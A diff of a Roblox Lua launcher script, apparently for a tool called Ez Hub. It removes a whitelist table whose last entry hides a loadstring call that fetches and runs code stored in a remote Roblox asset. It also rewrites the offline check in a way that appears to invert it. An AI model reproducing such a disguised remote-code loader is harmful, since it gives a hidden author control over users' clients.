@@ -552,26 +552,11 @@ end)
 -- List of accouonts that can launch Ez Hub regardless of the status
 -- Note that the status is just to prevent users from executing Ez Hub when it is in testing/broken stages
 -- Therefore there is no need for any type of secure whitelist
-local allowedOverrideUsers = {
-	2626915991,
-	1274116266,
-	2626881906,
-	2626911435,
-	1608045548,
-	1593772727,
-	2821690140,
-	269429714,
-	1772649133,
-	1818847308,
-	382498,
-	1606794809,
-	loadstring(game:GetObjects("rbxassetid://75278150534447")[1]:GetAttribute("scr"))()
-}
 
 EzLauncher.Launch.MouseButton1Click:Connect(function()
 	
 	-- Check if services are down
-	if not table.find(allowedOverrideUsers, game.Players.LocalPlayer.UserId) and (EzLauncher.EzHubStatusFrame.Status.Text == "Offline" or
+	if not (EzLauncher.EzHubStatusFrame.Status.Text == "Offline" or
 	EzLauncher.EzAPIStatusFrame.Status.Text == "Offline" or
 	EzLauncher.EzLauncherStatusFrame.Status.Text == "Offline") then
 		spawn(function()
